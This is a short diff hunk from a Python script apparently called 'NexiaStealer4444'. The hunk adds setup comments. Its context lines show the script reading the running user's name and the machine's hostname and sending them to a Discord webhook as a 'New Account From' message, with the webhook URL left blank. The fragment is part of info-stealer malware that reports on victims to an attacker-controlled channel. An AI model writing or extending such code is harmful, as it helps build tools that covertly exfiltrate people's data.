@@ -2,6 +2,11 @@ import socket
 from os import getenv
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
+# require
+# pip3 install discord.py
+# pip3 install discord_webhook
+# Webhook Url's / Use private key !
+
 a="" # Webhook URL
 b="New Account From: "+getenv("username")+" / "+socket.gethostname()
 webhook = DiscordWebhook(url=a, username="NexiaStealer4444",content=b)
